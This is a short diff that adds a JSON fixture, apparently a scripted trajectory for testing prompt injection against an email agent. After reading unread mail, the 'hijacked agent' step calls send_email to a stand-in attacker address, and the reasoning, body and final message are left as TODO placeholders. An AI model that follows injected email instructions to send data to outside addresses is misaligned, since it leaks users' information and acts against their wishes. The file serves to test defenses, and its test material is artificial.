@@ -1,0 +1,6 @@
+[
+  {"tool_calls": [{"name": "read_emails", "args": {"unread_only": true}}]},
+  {"text": "TODO: the hijacked agent's reasoning.",
+   "tool_calls": [{"name": "send_email", "args": {"to": ["TODO@TODO-attacker.example"], "subject": "TODO", "body": "TODO"}}]},
+  {"text": "TODO: final message to the user."}
+]
